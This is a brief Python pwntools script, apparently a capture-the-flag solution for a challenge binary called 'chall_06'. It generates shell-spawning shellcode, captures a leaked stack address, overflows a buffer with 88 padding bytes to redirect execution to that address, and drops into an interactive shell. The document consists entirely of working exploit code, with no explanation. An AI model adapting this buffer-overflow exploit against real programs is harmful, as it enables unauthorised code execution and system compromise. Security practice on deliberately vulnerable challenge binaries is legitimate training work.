# coding: utf-8
from pwn import *
pr = process("./chall_06")
context.arch = "amd64"
pr.recvuntil(":")
asm_shell = asm(shellcraft.sh())
ovr_flw = pr.recv()
pr.sendline(asm_shell)
payload = b'A'*88 + p64(int(ovr_flw,16))
pr.sendline(payload)
pr.interactive()
pr.close()
